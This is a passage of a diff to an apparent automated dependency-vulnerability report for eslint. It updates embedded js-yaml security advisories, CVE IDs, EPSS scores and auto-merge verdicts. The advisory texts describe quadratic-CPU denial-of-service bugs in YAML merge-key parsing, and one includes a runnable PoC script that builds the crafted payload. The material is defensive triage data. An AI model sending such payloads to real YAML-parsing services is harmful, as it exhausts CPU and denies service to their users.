source[key]);\n        overridableKeys[key] = true;\n      }\n    }\n\nEvery alias reference in the sequence resolves (by design) to the SAME object\nvia state.anchorMap. After the first merge, every subsequent merge of that same\nreference is a pure no-op semantically, but still performs:\n\n  * one Object.keys(source) call (O(K))\n  * K _hasOwnProperty.call checks on the destination\n\nTotal: M * K hasOwnProperty checks + M Object.keys allocations, while the final\nobject and all observable side effects are identical to a single merge.\n\nYAML semantics for `<<:` are idempotent and commutative over duplicate sources,\nso collapsing duplicates preserves behavior exactly; this isn't a spec trade-off.\n\n\n### PoC\nEnvironment:\njs-yaml version: 4.1.1\nNode.js: v24.5.0\nPlatform: arm64 macOS (reproduced consistently)\nReproduction script:\nCreate many keys in one anchored map (&a).\nMerge that same alias repeatedly via <<: [*a, *a, ...].\nMeasure parse time and compare with control payload using single merge (<<: *a).\nObserved repeated runs (same machine):\nK=M=1000, input 9,909 bytes: ~33\u201336 ms\nK=M=2000, input 20,909 bytes: ~121\u2013123 ms\nK=M=4000, input 42,909 bytes: ~524\u2013537 ms\nK=M=6000, input 64,909 bytes: ~1,608\u20131,829 ms\nK=M=8000, input 86,909 bytes: ~3,395\u20133,565 ms\nControl (single merge, similar key counts):\nK=2000: ~1\u20132 ms\nK=4000: ~3 ms\nK=8000: ~5 ms\nAlso verified: repeated-merge output equals single-merge output (same key count and same JSON), confirming excess time is redundant computation.\n\n\n### Impact\nThis is a denial-of-service vulnerability (CPU exhaustion / algorithmic complexity).\nAny service parsing untrusted YAML with js-yaml can be impacted, including API backends, CI tools, config processors, and automation services. An attacker can submit crafted YAML to significantly increase CPU time and reduce availability.\n\n### Suggested fix:\nDedupe the merge source list by reference before invoking mergeMappings. Any of\nthe following are minimal and preserve YAML 1.1 merge semantics:\n\ndedupe in storeMappingPair:\n\n    if (keyTag === 'tag:yaml.org,2002:merge') {\n      if (Array.isArray(valueNode)) {\n        var seen = new Set();\n        for (index = 0, quantity = valueNode.length; index < quantity; index += 1) {\n          var src = valueNode[index];\n          if (seen.has(src)) continue;   // idempotent; skip redundant alias\n          seen.add(src);\n          mergeMappings(state, _result, src, overridableKeys);\n        }\n      } else {\n        mergeMappings(state, _result, valueNode, overridableKeys);\n      }\n    }",
-        "remediation": "Upgrade js-yaml from 3.14.2 to 4.2.0 or later",
-        "source_url": "https://osv.dev/vulnerability/GHSA-h67p-54hq-rp68",
-        "advisory_id": "GHSA-h67p-54hq-rp68",
-        "fixed_versions": [
-          "4.2.0"
-        ],
-        "published_at": "2026-06-15",
-        "cve_id": "CVE-2026-53550",
-        "epss_score": 0.00251,
-        "epss_percentile": 0.1618,
-        "is_kev": false,
-        "kev_date_added": null,
-        "kev_due_date": null,
-        "kev_known_ransomware": false,
-        "finding_id": "4db22f51326cf321"
-      },
-      "related_findings": [
-        {
-          "dependency": {
-            "name": "js-yaml",
-            "version": "3.14.2",
-            "ecosystem": "npm",
-            "direct": false,
-            "path": [
-              "root",
-              "gray-matter",
-              "js-yaml"
-            ],
-            "parents": [
-              "gray-matter"
-            ],
-            "install_key": "node_modules/gray-matter/node_modules/js-yaml"
-          },
-          "lens": "cve",
-          "severity": "medium",
-          "score": 53.0,
-          "cvss_score": 5.3,
-          "title": "GHSA-h67p-54hq-rp68: JS-YAML: Quadratic-complexity DoS in merge key handling via repeated aliases",
-          "description": "### Summary\nA crafted YAML document can trigger algorithmic CPU exhaustion in `js-yaml` merge-key processing (`<<`) by repeating the same alias many times in a merge sequence.  \nThis causes quadratic parse-time behavior relative to input size and can block a Node.js worker/event loop for seconds with a relatively small payload (tens of KB), resulting in denial of service.\n\n### Details\nThe issue is in merge handling inside `lib/loader.js`:\n\n- `storeMappingPair(...)` iterates every element of a merge sequence when key tag is `tag:yaml.org,2002:merge`.\n- For each element, it calls `mergeMappings(...)`.\n- `mergeMappings(...)` computes `Object.keys(source)` and performs `_hasOwnProperty.call(destination, key)` checks for each key.\n\nWhen input is of the form:\n\na: &a {k0:0, k1:0, ..., kK:0}\nb: {<<: [*a, *a, *a, ... repeated M times ...]}\nall *a entries refer to the same anchored object. After the first merge, subsequent merges are semantically no-ops, but the parser still reprocesses all keys each time.\nResulting work is O(K * M), while input size is O(K + M), giving quadratic scaling as payload grows.\nRelevant code path:\nlib/loader.js in storeMappingPair(...) merge branch (keyTag === 'tag:yaml.org,2002:merge')\nlib/loader.js mergeMappings(...)\n\n\n### Root cause\nFile:       lib/loader.js\nFunction:   storeMappingPair(state, _result, overridableKeys, keyTag, keyNode,\n                             valueNode, startLine, startLineStart, startPos)\nLines:      ~359-366\n\n    if (keyTag === 'tag:yaml.org,2002:merge') {\n      if (Array.isArray(valueNode)) {\n        for (index = 0, quantity = valueNode.length; index < quantity; index += 1) {\n          mergeMappings(state, _result, valueNode[index], overridableKeys);\n        }\n      } else {\n        mergeMappings(state, _result, valueNode, overridableKeys);\n      }\n    }\n\nWhen the merge value is a sequence (YAML 1.1 <<: [ *a, *a, ... ]), each element\nis handed to mergeMappings() without deduplication. mergeMappings() then does\n\n    sourceKeys = Object.keys(source);\n    for (index = 0; index < sourceKeys.length; index += 1) {\n      key = sourceKeys[index];\n      if (!_hasOwnProperty.call(destination, key)) {\n        setProperty(destination, key, source[key]);\n        overridableKeys[key] = true;\n      }\n    }\n\nEvery alias reference in the sequence resolves (by design) to the SAME object\nvia state.anchorMap. After the first merge, every subsequent merge of that same\nreference is a pure no-op semantically, but still performs:\n\n  * one Object.keys(source) call (O(K))\n  * K _hasOwnProperty.call checks on the destination\n\nTotal: M * K hasOwnProperty checks + M Object.keys allocations, while the final\nobject and all observable side effects are identical to a single merge.\n\nYAML semantics for `<<:` are idempotent and commutative over duplicate sources,\nso collapsing duplicates preserves behavior exactly; this isn't a spec trade-off.\n\n\n### PoC\nEnvironment:\njs-yaml version: 4.1.1\nNode.js: v24.5.0\nPlatform: arm64 macOS (reproduced consistently)\nReproduction script:\nCreate many keys in one anchored map (&a).\nMerge that same alias repeatedly via <<: [*a, *a, ...].\nMeasure parse time and compare with control payload using single merge (<<: *a).\nObserved repeated runs (same machine):\nK=M=1000, input 9,909 bytes: ~33\u201336 ms\nK=M=2000, input 20,909 bytes: ~121\u2013123 ms\nK=M=4000, input 42,909 bytes: ~524\u2013537 ms\nK=M=6000, input 64,909 bytes: ~1,608\u20131,829 ms\nK=M=8000, input 86,909 bytes: ~3,395\u20133,565 ms\nControl (single merge, similar key counts):\nK=2000: ~1\u20132 ms\nK=4000: ~3 ms\nK=8000: ~5 ms\nAlso verified: repeated-merge output equals single-merge output (same key count and same JSON), confirming excess time is redundant computation.\n\n\n### Impact\nThis is a denial-of-service vulnerability (CPU exhaustion / algorithmic complexity).\nAny service parsing untrusted YAML with js-yaml can be impacted, including API backends, CI tools, config processors, and automation services. An attacker can submit crafted YAML to significantly increase CPU time and reduce availability.\n\n### Suggested fix:\nDedupe the merge source list by reference before invoking mergeMappings. Any of\nthe following are minimal and preserve YAML 1.1 merge semantics:\n\ndedupe in storeMappingPair:\n\n    if (keyTag === 'tag:yaml.org,2002:merge') {\n      if (Array.isArray(valueNode)) {\n        var seen = new Set();\n        for (index = 0, quantity = valueNode.length; index < quantity; index += 1) {\n          var src = valueNode[index];\n          if (seen.has(src)) continue;   // idempotent; skip redundant alias\n          seen.add(src);\n          mergeMappings(state, _result, src, overridableKeys);\n        }\n      } else {\n        mergeMappings(state, _result, valueNode, overridableKeys);\n      }\n    }",
-          "remediation": "Upgrade js-yaml from 3.14.2 to 4.2.0 or later",
-          "source_url": "https://osv.dev/vulnerability/GHSA-h67p-54hq-rp68",
-          "advisory_id": "GHSA-h67p-54hq-rp68",
-          "fixed_versions": [
-            "4.2.0"
-          ],
-          "published_at": "2026-06-15",
-          "cve_id": "CVE-2026-53550",
-          "epss_score": 0.00251,
-          "epss_percentile": 0.1618,
-          "is_kev": false,
-          "kev_date_added": null,
-          "kev_due_date": null,
-          "kev_known_ransomware": false,
-          "finding_id": "4db22f51326cf321"
-        }
-      ],
-      "candidate": {
-        "package": "js-yaml",
-        "from_version": "3.14.2",
-        "to_version": "4.2.0",
-        "fix_kind": "major",
-        "source_finding_ids": [
-          "4db22f51326cf321"
-        ],
-        "repo_id": "eslint/eslint",
-        "trust_subscore": 30,
-        "max_epss_score": 0.00251,
-        "max_epss_percentile": 0.1618,
-        "has_kev_finding": false,
-        "candidate_id": "c8883580e853cdcc"
-      },
-      "verdict": {
-        "candidate_id": "c8883580e853cdcc",
-        "tier": "review_required",
-        "score": 50,
-        "reasons": [
-          "major version bump requires human review (never auto-merge)"
-        ],
-        "veto_signals": [
-          "fix_kind.major"
-        ],
-        "evaluated_at": "2026-06-24T06:42:03.983270+00:00",
+        "evaluated_at": "2026-07-21T17:19:16.294582+00:00",
         "engine_version": "fix-confidence-v1.0.0"
       }
     },
@@ -1286,28 +1260,68 @@
           "install_key": "node_modules/markdownlint-cli2/node_modules/js-yaml"
         },
         "lens": "cve",
-        "severity": "medium",
-        "score": 53.0,
-        "cvss_score": 5.3,
-        "title": "GHSA-h67p-54hq-rp68: JS-YAML: Quadratic-complexity DoS in merge key handling via repeated aliases",
-        "description": "### Summary\nA crafted YAML document can trigger algorithmic CPU exhaustion in `js-yaml` merge-key processing (`<<`) by repeating the same alias many times in a merge sequence.  \nThis causes quadratic parse-time behavior relative to input size and can block a Node.js worker/event loop for seconds with a relatively small payload (tens of KB), resulting in denial of service.\n\n### Details\nThe issue is in merge handling inside `lib/loader.js`:\n\n- `storeMappingPair(...)` iterates every element of a merge sequence when key tag is `tag:yaml.org,2002:merge`.\n- For each element, it calls `mergeMappings(...)`.\n- `mergeMappings(...)` computes `Object.keys(source)` and performs `_hasOwnProperty.call(destination, key)` checks for each key.\n\nWhen input is of the form:\n\na: &a {k0:0, k1:0, ..., kK:0}\nb: {<<: [*a, *a, *a, ... repeated M times ...]}\nall *a entries refer to the same anchored object. After the first merge, subsequent merges are semantically no-ops, but the parser still reprocesses all keys each time.\nResulting work is O(K * M), while input size is O(K + M), giving quadratic scaling as payload grows.\nRelevant code path:\nlib/loader.js in storeMappingPair(...) merge branch (keyTag === 'tag:yaml.org,2002:merge')\nlib/loader.js mergeMappings(...)\n\n\n### Root cause\nFile:       lib/loader.js\nFunction:   storeMappingPair(state, _result, overridableKeys, keyTag, keyNode,\n                             valueNode, startLine, startLineStart, startPos)\nLines:      ~359-366\n\n    if (keyTag === 'tag:yaml.org,2002:merge') {\n      if (Array.isArray(valueNode)) {\n        for (index = 0, quantity = valueNode.length; index < quantity; index += 1) {\n          mergeMappings(state, _result, valueNode[index], overridableKeys);\n        }\n      } else {\n        mergeMappings(state, _result, valueNode, overridableKeys);\n      }\n    }\n\nWhen the merge value is a sequence (YAML 1.1 <<: [ *a, *a, ... ]), each element\nis handed to mergeMappings() without deduplication. mergeMappings() then does\n\n    sourceKeys = Object.keys(source);\n    for (index = 0; index < sourceKeys.length; index += 1) {\n      key = sourceKeys[index];\n      if (!_hasOwnProperty.call(destination, key)) {\n        setProperty(destination, key, source[key]);\n        overridableKeys[key] = true;\n      }\n    }\n\nEvery alias reference in the sequence resolves (by design) to the SAME object\nvia state.anchorMap. After the first merge, every subsequent merge of that same\nreference is a pure no-op semantically, but still performs:\n\n  * one Object.keys(source) call (O(K))\n  * K _hasOwnProperty.call checks on the destination\n\nTotal: M * K hasOwnProperty checks + M Object.keys allocations, while the final\nobject and all observable side effects are identical to a single merge.\n\nYAML semantics for `<<:` are idempotent and commutative over duplicate sources,\nso collapsing duplicates preserves behavior exactly; this isn't a spec trade-off.\n\n\n### PoC\nEnvironment:\njs-yaml version: 4.1.1\nNode.js: v24.5.0\nPlatform: arm64 macOS (reproduced consistently)\nReproduction script:\nCreate many keys in one anchored map (&a).\nMerge that same alias repeatedly via <<: [*a, *a, ...].\nMeasure parse time and compare with control payload using single merge (<<: *a).\nObserved repeated runs (same machine):\nK=M=1000, input 9,909 bytes: ~33\u201336 ms\nK=M=2000, input 20,909 bytes: ~121\u2013123 ms\nK=M=4000, input 42,909 bytes: ~524\u2013537 ms\nK=M=6000, input 64,909 bytes: ~1,608\u20131,829 ms\nK=M=8000, input 86,909 bytes: ~3,395\u20133,565 ms\nControl (single merge, similar key counts):\nK=2000: ~1\u20132 ms\nK=4000: ~3 ms\nK=8000: ~5 ms\nAlso verified: repeated-merge output equals single-merge output (same key count and same JSON), confirming excess time is redundant computation.\n\n\n### Impact\nThis is a denial-of-service vulnerability (CPU exhaustion / algorithmic complexity).\nAny service parsing untrusted YAML with js-yaml can be impacted, including API backends, CI tools, config processors, and automation services. An attacker can submit crafted YAML to significantly increase CPU time and reduce availability.\n\n### Suggested fix:\nDedupe the merge source list by reference before invoking mergeMappings. Any of\nthe following are minimal and preserve YAML 1.1 merge semantics:\n\ndedupe in storeMappingPair:\n\n    if (keyTag === 'tag:yaml.org,2002:merge') {\n      if (Array.isArray(valueNode)) {\n        var seen = new Set();\n        for (index = 0, quantity = valueNode.length; index < quantity; index += 1) {\n          var src = valueNode[index];\n          if (seen.has(src)) continue;   // idempotent; skip redundant alias\n          seen.add(src);\n          mergeMappings(state, _result, src, overridableKeys);\n        }\n      } else {\n        mergeMappings(state, _result, valueNode, overridableKeys);\n      }\n    }",
-        "remediation": "Upgrade js-yaml from 4.1.1 to 4.2.0 or later",
-        "source_url": "https://osv.dev/vulnerability/GHSA-h67p-54hq-rp68",
-        "advisory_id": "GHSA-h67p-54hq-rp68",
+        "severity": "high",
+        "score": 75.0,
+        "cvss_score": 7.5,
+        "title": "GHSA-52cp-r559-cp3m: js-yaml: YAML merge-key chains can force quadratic CPU consumption",
+        "description": "### Impact\n\njs-yaml can spend quadratic CPU time parsing a document whose size grows only linearly. The issue is triggered by a chain of mappings where each mapping merges the previous one:\n\n```yaml\na0: &a0 { k0: 0 }\na1: &a1 { <<: *a0, k1: 1 }\na2: &a2 { <<: *a1, k2: 2 }\na3: &a3 { <<: *a2, k3: 3 }\n...\nb: *aN\n```\n\nFor each new mapping, the loader has to enumerate the keys inherited from the previous mapping. With N chained mappings, this results in roughly 1 + 2 + ... + N merged-key visits, i.e., O(N^2) work for O(N) input size.\n\n### PoC\n\nFrom N = 4000 delay become > 1s (doc size < 100K)\n\n```js\nimport { performance } from 'node:perf_hooks'\nimport { Buffer } from 'node:buffer'\nimport { load, YAML11_SCHEMA } from 'js-yaml'\n\nconst n = Number(process.argv[2] || 4000)\n\nfunction makeMergeChain (count) {\n  const lines = ['a0: &a0 { k0: 0 }']\n\n  for (let i = 1; i < count; i++) {\n    lines.push(`a${i}: &a${i} { <<: *a${i - 1}, k${i}: ${i} }`)\n  }\n\n  lines.push(`b: *a${count - 1}`)\n  return `${lines.join('\\n')}\\n`\n}\n\nconst source = makeMergeChain(n)\n\nconsole.log(source.split('\\n').slice(0, 8).join('\\n'))\nconsole.log('...')\nconsole.log(source.split('\\n').slice(-4).join('\\n'))\nconsole.log()\nconsole.log(`N: ${n}`)\nconsole.log(`YAML size: ${Buffer.byteLength(source)} bytes`)\n\nconst started = performance.now()\nconst result = load(source, { schema: YAML11_SCHEMA })\nconst elapsed = performance.now() - started\n\nconsole.log(`parse time: ${elapsed.toFixed(1)} ms`)\nconsole.log(`top-level keys: ${Object.keys(result).length}`)\nconsole.log(`b keys: ${Object.keys(result.b).length}`)\n```\n\n### Patches\n\nFix released. The most robust protection is to limit the total number of merged keys per parse call. This should close all past and future edge cases with merge. The default 10K-key limit should be okay in most cases.",
+        "remediation": "Upgrade js-yaml from 4.1.1 to 4.3.0 or later",
+        "source_url": "https://osv.dev/vulnerability/GHSA-52cp-r559-cp3m",
+        "advisory_id": "GHSA-52cp-r559-cp3m",
         "fixed_versions": [
-          "4.2.0"
+          "3.15.0",
+          "4.3.0"
         ],
-        "published_at": "2026-06-15",
-        "cve_id": "CVE-2026-53550",
-        "epss_score": 0.00251,
-        "epss_percentile": 0.1618,
+        "published_at": "2026-07-20",
+        "cve_id": "CVE-2026-59869",
+        "epss_score": 0.0037,
+        "epss_percentile": 0.29385,
         "is_kev": false,
         "kev_date_added": null,
         "kev_due_date": null,
         "kev_known_ransomware": false,
-        "finding_id": "538452b62c34fbd9"
+        "finding_id": "a0f8ede85ca16b5d"
       },
       "related_findings": [
+        {
+          "dependency": {
+            "name": "js-yaml",
+            "version": "4.1.1",
+            "ecosystem": "npm",
+            "direct": false,
+            "path": [
+              "root",
+              "markdownlint-cli2",
+              "js-yaml"
+            ],
+            "parents": [
+              "markdownlint-cli2"
+            ],
+            "install_key": "node_modules/markdownlint-cli2/node_modules/js-yaml"
+          },
+          "lens": "cve",
+          "severity": "high",
+          "score": 75.0,
+          "cvss_score": 7.5,
+          "title": "GHSA-52cp-r559-cp3m: js-yaml: YAML merge-key chains can force quadratic CPU consumption",
+          "description": "### Impact\n\njs-yaml can spend quadratic CPU time parsing a document whose size grows only linearly. The issue is triggered by a chain of mappings where each mapping merges the previous one:\n\n```yaml\na0: &a0 { k0: 0 }\na1: &a1 { <<: *a0, k1: 1 }\na2: &a2 { <<: *a1, k2: 2 }\na3: &a3 { <<: *a2, k3: 3 }\n...\nb: *aN\n```\n\nFor each new mapping, the loader has to enumerate the keys inherited from the previous mapping. With N chained mappings, this results in roughly 1 + 2 + ... + N merged-key visits, i.e., O(N^2) work for O(N) input size.\n\n### PoC\n\nFrom N = 4000 delay become > 1s (doc size < 100K)\n\n```js\nimport { performance } from 'node:perf_hooks'\nimport { Buffer } from 'node:buffer'\nimport { load, YAML11_SCHEMA } from 'js-yaml'\n\nconst n = Number(process.argv[2] || 4000)\n\nfunction makeMergeChain (count) {\n  const lines = ['a0: &a0 { k0: 0 }']\n\n  for (let i = 1; i < count; i++) {\n    lines.push(`a${i}: &a${i} { <<: *a${i - 1}, k${i}: ${i} }`)\n  }\n\n  lines.push(`b: *a${count - 1}`)\n  return `${lines.join('\\n')}\\n`\n}\n\nconst source = makeMergeChain(n)\n\nconsole.log(source.split('\\n').slice(0, 8).join('\\n'))\nconsole.log('...')\nconsole.log(source.split('\\n').slice(-4).join('\\n'))\nconsole.log()\nconsole.log(`N: ${n}`)\nconsole.log(`YAML size: ${Buffer.byteLength(source)} bytes`)\n\nconst started = performance.now()\nconst result = load(source, { schema: YAML11_SCHEMA })\nconst elapsed = performance.now() - started\n\nconsole.log(`parse time: ${elapsed.toFixed(1)} ms`)\nconsole.log(`top-level keys: ${Object.keys(result).length}`)\nconsole.log(`b keys: ${Object.keys(result.b).length}`)\n```\n\n### Patches\n\nFix released. The most robust protection is to limit the total number of merged keys per parse call. This should close all past and future edge cases with merge. The default 10K-key limit should be okay in most cases.",
+          "remediation": "Upgrade js-yaml from 4.1.1 to 4.3.0 or later",
+          "source_url": "https://osv.dev/vulnerability/GHSA-52cp-r559-cp3m",
+          "advisory_id": "GHSA-52cp-r559-cp3m",
+          "fixed_versions": [
+            "3.15.0",
+            "4.3.0"
+          ],
+          "published_at": "2026-07-20",
+          "cve_id": "CVE-2026-59869",
+          "epss_score": 0.0037,
+          "epss_percentile": 0.29385,
+          "is_kev": false,
+          "kev_date_added": null,
+          "kev_due_date": null,
+          "kev_known_ransomware": false,
+          "finding_id": "a0f8ede85ca16b5d"
+        },
         {
           "dependency": {
             "name": "js-yaml",
@@ -1334,12 +1348,13 @@
           "source_url": "https://osv.dev/vulnerability/GHSA-h67p-54hq-rp68",
           "advisory_id": "GHSA-h67p-54hq-rp68",
           "fixed_versions": [
+            "3.15.0",
             "4.2.0"
           ],
           "published_at": "2026-06-15",
           "cve_id": "CVE-2026-53550",
-          "epss_score": 0.00251,
-          "epss_percentile": 0.1618,
+          "epss_score": 0.00259,
+          "epss_percentile": 0.17503,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -1350,27 +1365,28 @@
       "candidate": {
         "package": "js-yaml",
         "from_version": "4.1.1",
-        "to_version": "4.2.0",
+        "to_version": "4.3.0",
         "fix_kind": "minor",
         "source_finding_ids": [
-          "538452b62c34fbd9"
+          "538452b62c34fbd9",
+          "a0f8ede85ca16b5d"
         ],
         "repo_id": "eslint/eslint",
         "trust_subscore": 30,
-        "max_epss_score": 0.00251,
-        "max_epss_percentile": 0.1618,
+        "max_epss_score": 0.0037,
+        "max_epss_percentile": 0.29385,
         "has_kev_finding": false,
-        "candidate_id": "f5514b38e46302bc"
+        "candidate_id": "c85b1dfa6892a9d2"
       },
       "verdict": {
-        "candidate_id": "f5514b38e46302bc",
+        "candidate_id": "c85b1dfa6892a9d2",
         "tier": "auto_merge",
         "score": 100,
         "reasons": [
           "minor-level upgrade; trust signals unchanged; CI verifies tests"
         ],
         "veto_signals": [],
-        "evaluated_at": "2026-06-24T06:42:04.039822+00:00",
+        "evaluated_at": "2026-07-21T17:19:16.352921+00:00",
         "engine_version": "fix-confidence-v1.0.0"
       }
     },
@@ -1404,9 +1420,9 @@
           "4.18.0"
         ],
         "published_at": "2026-04-01",
-        "cve_id": "CVE-2026-4800",
-        "epss_score": 0.01026,
-        "epss_percentile": 0.59101,
+        "cve_id": "CVE-2021-23337",
+        "epss_score": 0.2241,
+        "epss_percentile": 0.97438,
         "is_kev": false,
         "kev_date_added": null,
         "kev_due_date": null,
@@ -1443,9 +1459,9 @@
             "4.18.0"
           ],
           "published_at": "2026-04-01",
-          "cve_id": "CVE-2026-4800",
-          "epss_score": 0.01026,
-          "epss_percentile": 0.59101,
+          "cve_id": "CVE-2021-23337",
+          "epss_score": 0.2241,
+          "epss_percentile": 0.97438,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -1482,9 +1498,9 @@
             "4.18.0"
           ],
           "published_at": "2026-04-01",
-          "cve_id": "CVE-2026-4800",
-          "epss_score": 0.01026,
-          "epss_percentile": 0.59101,
+          "cve_id": "CVE-2021-23337",
+          "epss_score": 0.2241,
+          "epss_percentile": 0.97438,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -1520,9 +1536,9 @@
             "4.18.0"
           ],
           "published_at": "2026-04-01",
-          "cve_id": "CVE-2026-4800",
-          "epss_score": 0.01026,
-          "epss_percentile": 0.59101,
+          "cve_id": "CVE-2021-23337",
+          "epss_score": 0.2241,
+          "epss_percentile": 0.97438,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -1559,9 +1575,9 @@
             "4.18.0"
           ],
           "published_at": "2026-04-01",
-          "cve_id": "CVE-2026-2950",
-          "epss_score": 0.00297,
-          "epss_percentile": 0.21198,
+          "cve_id": "CVE-2025-13465",
+          "epss_score": 0.01535,
+          "epss_percentile": 0.7209,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -1597,9 +1613,9 @@
             "4.18.0"
           ],
           "published_at": "2026-04-01",
-          "cve_id": "CVE-2026-2950",
-          "epss_score": 0.00297,
-          "epss_percentile": 0.21198,
+          "cve_id": "CVE-2025-13465",
+          "epss_score": 0.01535,
+          "epss_percentile": 0.7209,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -1635,9 +1651,9 @@
             "4.18.0"
           ],
           "published_at": "2026-04-01",
-          "cve_id": "CVE-2026-2950",
-          "epss_score": 0.00297,
-          "epss_percentile": 0.21198,
+          "cve_id": "CVE-2025-13465",
+          "epss_score": 0.01535,
+          "epss_percentile": 0.7209,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -1660,8 +1676,8 @@
         ],
         "repo_id": "eslint/eslint",
         "trust_subscore": 0,
-        "max_epss_score": 0.01026,
-        "max_epss_percentile": 0.59101,
+        "max_epss_score": 0.2241,
+        "max_epss_percentile": 0.97438,
         "has_kev_finding": false,
         "candidate_id": "e2b71f42a38c98a4"
       },
@@ -1673,7 +1689,7 @@
           "minor-level upgrade; trust signals unchanged; CI verifies tests"
         ],
         "veto_signals": [],
-        "evaluated_at": "2026-06-24T06:42:04.099881+00:00",
+        "evaluated_at": "2026-07-21T17:19:16.413522+00:00",
         "engine_version": "fix-confidence-v1.0.0"
       }
     },
@@ -1708,8 +1724,8 @@
         ],
         "published_at": "2026-06-15",
         "cve_id": "CVE-2026-48988",
-        "epss_score": 0.00252,
-        "epss_percentile": 0.16294,
+        "epss_score": 0.00306,
+        "epss_percentile": 0.22649,
         "is_kev": false,
         "kev_date_added": null,
         "kev_due_date": null,
@@ -1747,8 +1763,8 @@
           ],
           "published_at": "2026-06-15",
           "cve_id": "CVE-2026-48988",
-          "epss_score": 0.00252,
-          "epss_percentile": 0.16294,
+          "epss_score": 0.00306,
+          "epss_percentile": 0.22649,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -1766,8 +1782,8 @@
         ],
         "repo_id": "eslint/eslint",
         "trust_subscore": 30,
-        "max_epss_score": 0.00252,
-        "max_epss_percentile": 0.16294,
+        "max_epss_score": 0.00306,
+        "max_epss_percentile": 0.22649,
         "has_kev_finding": false,
         "candidate_id": "4a3cbdd638c1b6ec"
       },
@@ -1779,7 +1795,7 @@
           "minor-level upgrade; trust signals unchanged; CI verifies tests"
         ],
         "veto_signals": [],
-        "evaluated_at": "2026-06-24T06:42:04.236784+00:00",
+        "evaluated_at": "2026-07-21T17:19:16.554401+00:00",
         "engine_version": "fix-confidence-v1.0.0"
       }
     },
@@ -1815,8 +1831,8 @@
         ],
         "published_at": "2021-09-20",
         "cve_id": "CVE-2021-3803",
-        "epss_score": 0.02014,
-        "epss_percentile": 0.78362,
+        "epss_score": 0.02165,
+        "epss_percentile": 0.80262,
         "is_kev": false,
         "kev_date_added": null,
         "kev_due_date": null,
@@ -1855,8 +1871,8 @@
           ],
           "published_at": "2021-09-20",
           "cve_id": "CVE-2021-3803",
-          "epss_score": 0.02014,
-          "epss_percentile": 0.78362,
+          "epss_score": 0.02165,
+          "epss_percentile": 0.80262,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -1874,8 +1890,8 @@
         ],
         "repo_id": "eslint/eslint",
         "trust_subscore": 30,
-        "max_epss_score": 0.02014,
-        "max_epss_percentile": 0.78362,
+        "max_epss_score": 0.02165,
+        "max_epss_percentile": 0.80262,
         "has_kev_finding": false,
         "candidate_id": "ee321bb45e8ad56b"
       },
@@ -1889,7 +1905,7 @@
         "veto_signals": [
           "fix_kind.major"
         ],
-        "evaluated_at": "2026-06-24T06:42:04.293043+00:00",
+        "evaluated_at": "2026-07-21T17:19:17.063510+00:00",
         "engine_version": "fix-confidence-v1.0.0"
       }
     },
@@ -1927,7 +1943,7 @@
         "published_at": "2026-05-22",
         "cve_id": "CVE-2026-8723",
         "epss_score": 0.00351,
-        "epss_percentile": 0.26831,
+        "epss_percentile": 0.27435,
         "is_kev": false,
         "kev_date_added": null,
         "kev_due_date": null,
@@ -1968,7 +1984,7 @@
           "published_at": "2026-05-22",
           "cve_id": "CVE-2026-8723",
           "epss_score": 0.00351,
-          "epss_percentile": 0.26831,
+          "epss_percentile": 0.27435,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -1987,7 +2003,7 @@
         "repo_id": "eslint/eslint",
         "trust_subscore": 0,
         "max_epss_score": 0.00351,
-        "max_epss_percentile": 0.26831,
+        "max_epss_percentile": 0.27435,
         "has_kev_finding": false,
         "candidate_id": "fd693062a250592b"
       },
@@ -1999,7 +2015,7 @@
           "minor-level upgrade; trust signals unchanged; CI verifies tests"
         ],
         "veto_signals": [],
-        "evaluated_at": "2026-06-24T06:42:04.354494+00:00",
+        "evaluated_at": "2026-07-21T17:19:17.128064+00:00",
         "engine_version": "fix-confidence-v1.0.0"
       }
     },
@@ -2112,7 +2128,7 @@
           "published_at": "2026-03-27",
           "cve_id": "CVE-2026-34043",
           "epss_score": 0.00472,
-          "epss_percentile": 0.37158,
+          "epss_percentile": 0.37902,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -2132,7 +2148,7 @@
         "repo_id": "eslint/eslint",
         "trust_subscore": 0,
         "max_epss_score": 0.00472,
-        "max_epss_percentile": 0.37158,
+        "max_epss_percentile": 0.37902,
         "has_kev_finding": false,
         "candidate_id": "83f0806a4af184fd"
       },
@@ -2146,7 +2162,7 @@
         "veto_signals": [
           "fix_kind.major"
         ],
-        "evaluated_at": "2026-06-24T06:42:04.410450+00:00",
+        "evaluated_at": "2026-07-21T17:19:17.183080+00:00",
         "engine_version": "fix-confidence-v1.0.0"
       }
     },
@@ -2182,7 +2198,7 @@
         "published_at": "2021-05-06",
         "cve_id": "CVE-2021-23358",
         "epss_score": 0.04087,
-        "epss_percentile": 0.89402,
+        "epss_percentile": 0.89613,
         "is_kev": false,
         "kev_date_added": null,
         "kev_due_date": null,
@@ -2221,7 +2237,7 @@
           "published_at": "2021-05-06",
           "cve_id": "CVE-2021-23358",
           "epss_score": 0.04087,
-          "epss_percentile": 0.89402,
+          "epss_percentile": 0.89613,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -2259,7 +2275,7 @@
           "published_at": "2026-03-03",
           "cve_id": "CVE-2026-27601",
           "epss_score": 0.00612,
-          "epss_percentile": 0.44613,
+          "epss_percentile": 0.45399,
           "is_kev": false,
           "kev_date_added": null,
           "kev_due_date": null,
@@ -2279,7 +2295,7 @@
         "repo_id": "eslint/eslint",
         "trust_subscore": 30,
         "max_epss_score": 0.04087,
-        "max_epss_percentile": 0.89402,
+        "max_epss_percentile": 0.89613,
         "has_kev_finding": false,
         "candidate_id": "8c3b4eefd64e6e9e"
       },
@@ -2293,7 +2309,7 @@
         "veto_signals": [
           "trust.new_maintainer"
         ],
-        "evaluated_at": "2026-06-24T06:42:04.540636+00:00",
+        "evaluated_at": "2026-07-21T17:19:18.084738+00:00",
         "engine_version": "fix-confidence-v1.0.0"
       }
     },
@@ -2332,7 +2348,7 @@
